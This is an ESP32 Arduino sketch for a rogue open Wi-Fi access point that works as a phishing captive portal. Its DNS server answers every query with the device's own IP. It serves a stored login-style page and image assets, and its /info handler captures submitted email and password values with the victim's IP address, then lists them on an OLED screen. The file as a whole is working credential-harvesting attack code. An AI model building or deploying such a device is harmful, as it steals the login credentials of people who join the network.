#include "Arduino.h"
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include "DNSMessage.h"
#include "FS.h"
#include "SPIFFS.h"
#include "ESP32WebServer.h"
#include "AccountList.h"
//#include <ESP8266WebServerSecure.h>
//Bits are left to right - total 8 bits

#ifndef LED_BUILTIN
#define LED_BUILTIN 2
#endif

#define TOUCH_BTN_PIN T9 //GPIO 32
#define OLED_RESET 4
Adafruit_SSD1306 display(OLED_RESET);
AccountList *list;

#if (SSD1306_LCDHEIGHT != 64)
#error("Height incorrect, please fix Adafruit_SSD1306.h!");
#endif
//------PAYLOAD ----------------<img src='im.png' height='2000' width='1500'/>
//char payload[] = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style> body, html {height: 100%; margin: 0;}.bg {background-image: url('im.png');height: 100%;background-position: center;background-repeat: no-repeat;background-size: contain;}</style></head><body><div class='bg'></div></body></html>";

//Function declearation.
void blink(int amount, int length, int halt);
void handleHttpRoot();
void handleHttpImage();
void handleLogo();
void handleProfile();
void handleFooter();
void handleStyle();
void showInfo();
void moveDown();


//1AManInTh3Middl3
const char *ssid = "!DONT JOIN!!";
const char *password = "";
IPAddress apIP(192, 168, 1, 1);

char incomingPacket[255];

//ESP8266WebServerSecure server(443);
ESP32WebServer httpserver(80);
WiFiUDP DNSserver;
//ESP8266WebServerSecure httpserver(8080);

IPAddress myIP;
//File f;





void setup() {
	delay(4000);
	Serial.begin(9600);
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  display.display();
  delay(2000);
  display.clearDisplay();

  display.setTextSize(2.8);
  display.setTextColor(WHITE);
  display.setCursor(0,0);
  display.println("Welcome!");
  display.display();
  display.setTextSize(1);

  pinMode(LED_BUILTIN, OUTPUT);
  blink(1,2000,1000);

	Serial.println();
  Serial.println("Initializing...");

  list = new AccountList();
  //Serial.println("ASKED1");
  //bool b = SPIFFS.format();

  //Serial.println(a);
  //Serial.println(b);





	Serial.println("Configuring access point...");
	/* You can remove the password parameter if you want the AP to be open. */

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid);
  //WiFi.clients();

	myIP = WiFi.softAPIP();
	Serial.println("AP IP address: ");
	Serial.println(myIP);
  blink(1,500,250);

  //Setting TLS http server
  //server.setServerKeyAndCert_P(rsakey, sizeof(rsakey), x509, sizeof(x509));
	//server.on("/", handleHttpsRoot);
  //server.on("/im.png", handleHttpsImage);

	//server.begin();
  //blink(1,500,250);

  //Setting HTTP server
  httpserver.on("/", handleHttpRoot);
  httpserver.on("/im.png", handleHttpImage);
  httpserver.on("/logo.png", handleLogo);
  httpserver.on("/profile-img.png", handleProfile);
  httpserver.on("/footer-logo.png", handleFooter);
  httpserver.on("/style.css", handleStyle);
  httpserver.on("/info",showInfo);
	httpserver.begin();
  blink(1,500,250);

  Serial.println("Initializing DNS server...");
 DNSserver.begin(53);
 blink(1,500,250);
 Serial.println("DONE.");
}

void loop() {


	//server.handleClient();
  httpserver.handleClient();


  int packetSize = DNSserver.parsePacket();
  if (packetSize)
  {
    // receive incoming UDP packets
    Packet recieved;
    Packet response;

    //Serial.printf("Received %d bytes from %s, port %d\n", packetSize, DNSserver.remoteIP().toString().c_str(), DNSserver.remotePort());
    recieved.size = DNSserver.read(incomingPacket, 255);

    if (recieved.size > 0)
    {
      incomingPacket[recieved.size] = 0;
    }
    int i = 0;
    while(i<recieved.size){
      recieved.buffer[i] = incomingPacket[i];
      i = i+1;
    }

    //printField(&recieved);
    DNSMessage *msg = new DNSMessage(recieved);
    bool finish = msg->creatResponseDNSPacket(myIP);
    if(finish){
    //Serial.printf("UDP packet contents: %s\n", incomingPacket);
    //responseHeader.value[11] = 'A';
    // send back a reply, to the IP address and port we got the packet from
    DNSserver.beginPacket(DNSserver.remoteIP(), DNSserver.remotePort());
    //Serial.println(msg->response.size);
    DNSserver.write((const uint8_t*)(msg->response.buffer), msg->response.size);
    DNSserver.endPacket();
    delete msg;
  }else{
    Serial.println("Problem making response...");
    delete msg;
  }
  }




  int touch_value = touchRead(TOUCH_BTN_PIN);
  //Serial.println(touch_value);
  if(touch_value<30){
    blink(1,100,0);
    moveDown();
  }

}
void moveDown(){
  list->moveDown();
  list->print(&display);
}

void showInfo(){
  //Will implement screen.
   //Serial.println(httpserver.arg("pass"));
   //Serial.println(httpserver.arg("mail"));
   /*display.println("----------------");
   display.print("Email: ");
   display.println(httpserver.arg("mail"));
   display.print("Password: ");
   display.println(httpserver.arg("pass"));
   display.display();*/

   list->addNode(httpserver.arg("mail"), httpserver.arg("pass"),httpserver.client().remoteIP());
   list->print(&display);
  //display.stopscroll();
   delay(2000);
}


void blink(int amount, int length, int halt){
  int blinks = 0;
  while(blinks<amount){
    digitalWrite(LED_BUILTIN, HIGH);
    delay(length);
    digitalWrite(LED_BUILTIN, LOW);
    delay(halt);
    blinks++;
  }
}
void p(char X) {

   if (X < 16) {Serial.print("0");}

   Serial.println(X, HEX);

}
void printField(Packet *packet){
  //int i = 0;
  /*while(i<12){
    p(header->value[i]);
    i = i+1;
  }
  */
  Serial.printf("\nTransaction ID: ");
  //First 18 bits are the message id.
  Serial.print(packet->buffer[0], HEX);
  Serial.println(packet->buffer[1], HEX);
  //Print type of message.
  Serial.printf("Recived message type: %s\n", ((packet->buffer[2]&0x80)==0)?"Querry":"Response");
}


/*void handleHttpsRoot() {
  Serial.println("HTTPS Request recieved. ");
	server.send(200, "text/html", payload);
}*/


void handleHttpRoot(){
  Serial.println("HTTP Request recieved. ");
  File f;
  if(SPIFFS.begin()){
    f = SPIFFS.open("/index.html", "r");
    Serial.println("Resource loaded...");
  }else{
    Serial.print("Fatal fail!");
    while(1);
}
  httpserver.streamFile(f,"text/html");
  /*char buf[1024];
   int siz = f.size();
   while(siz > 0) {
     size_t len = std::min((int)(sizeof(buf) - 1), siz);
     f.read((uint8_t *)buf, len);
     httpserver.client().write((const char*)buf, len);
     siz -= len;
   }*/
  Serial.println("Closing file...");
  f.close();
  Serial.println("Done!");
}
void handleStyle(){
  Serial.println("Style req");
  File f;
  if(SPIFFS.begin()){
    f = SPIFFS.open("/style.css", "r");
    Serial.println("Resource loaded...");
  }else{
    Serial.print("Fatal fail!");
    while(1);
}
  //httpserver.streamFile(f,"text/css");
  char buf[1024];
   int siz = f.size();
   while(siz > 0) {
     size_t len = std::min((int)(sizeof(buf) - 1), siz);
     f.read((uint8_t *)buf, len);
     httpserver.client().write((const char*)buf, len);
     siz -= len;
   }
  Serial.println("Closing file...");
  f.close();
  Serial.println("Done!");
}
void handleLogo(){
  Serial.println("Logo req ");
  File f;
  if(SPIFFS.begin()){
    f = SPIFFS.open("/logo.JPG", "r");
    Serial.println("Resource loaded...");
  }else{
    Serial.print("Fatal fail!");
    while(1);
}
  //httpserver.streamFile(f,"image/png");
  char buf[1024];
   int siz = f.size();
   while(siz > 0) {
     size_t len = std::min((int)(sizeof(buf) - 1), siz);
     f.read((uint8_t *)buf, len);
     httpserver.client().write((const char*)buf, len);

     siz -= len;
   }
  Serial.println("Closing file...");
  f.close();
  Serial.println("Done!");
}
void handleProfile(){
  Serial.println("profile image req");
  File f;
  if(SPIFFS.begin()){
    f = SPIFFS.open("/profile-img.jpg", "r");
    Serial.println("Resource loaded...");
  }else{
    Serial.print("Fatal fail!");
    while(1);
}
  //httpserver.streamFile(f,"image/png");
  char buf[1024];
   int siz = f.size();
   while(siz > 0) {
     size_t len = std::min((int)(sizeof(buf) - 1), siz);
     f.read((uint8_t *)buf, len);
     //Serial.println(siz);
     //Serial.println(len);
     httpserver.client().write((const char*)buf, len);

     siz -= len;
   }
  Serial.println("Closing file...");
  f.close();
  Serial.println("Done!");
}
void handleFooter(){
  Serial.println("Footer req ");
  File f;
  if(SPIFFS.begin()){
    f = SPIFFS.open("/footer-logo.JPG", "r");
    Serial.println("Resource loaded...");
  }else{
    Serial.print("Fatal fail!");
    while(1);
}
  //httpserver.streamFile(f,"image/png");
  char buf[1024];
   int siz = f.size();
   while(siz > 0) {
     size_t len = std::min((int)(sizeof(buf) - 1), siz);
     f.read((uint8_t *)buf, len);
     httpserver.client().write((const char*)buf, len);
     siz -= len;
   }
  Serial.println("Closing file...");
  f.close();
  Serial.println("Done!");
}
/*void handleHttpsImage(){
  Serial.println("Loading resource...");
  File f;
  if(SPIFFS.begin()){
    f = SPIFFS.open("/hacked.png", "r");
    Serial.println("Resource loaded...");
  }else{
    Serial.print("Fatal fail!");
    while(1);
}
Serial.println("Streaming Resource...(HTTPS)");
  server.streamFile(f, "image/png");
//  server.write("HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: image/png\r\nContent-Length: %d",ftell(f));
  //server.write("HTTP/1.1 200 OK\r\n");
  Serial.println("Closing file...");
  f.close();
  Serial.println("Done!");
}*/


void handleHttpImage(){
  Serial.println("Loading resource...");
  File f;
  if(SPIFFS.begin()){
    f = SPIFFS.open("/hacked.png", "r");
    Serial.println(f.size());
    Serial.println("Resource loaded...");
  }else{
    Serial.print("Fatal fail!");
    while(1);
}
Serial.println("Streaming Resource...(HTTP)");
  httpserver.streamFile(f, "image/png");
//  server.write("HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: image/png\r\nContent-Length: %d",ftell(f));
  //server.write("HTTP/1.1 200 OK\r\n");
  Serial.println("Closing file...");
  f.close();
  Serial.println("Done!");
}
